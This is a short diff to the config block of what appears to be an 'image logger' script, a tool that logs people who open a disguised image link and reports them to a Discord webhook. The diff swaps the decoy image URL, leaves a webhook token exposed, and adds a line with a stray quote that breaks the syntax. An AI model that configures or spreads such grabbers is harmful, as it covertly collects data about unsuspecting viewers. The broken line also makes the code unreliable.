@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1561900382983028756/n1f8buMJ5tZhFbqdhIdc5V8p-NKY4WPbMphprir2fs85TQHIxIVtcU1oazqkTvqHWvdT",
-    "image": "https://bluemoji.io/cdn-proxy/646218c67da47160c64a84d5/66b3e2b30608f3f68caf31d3_94.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
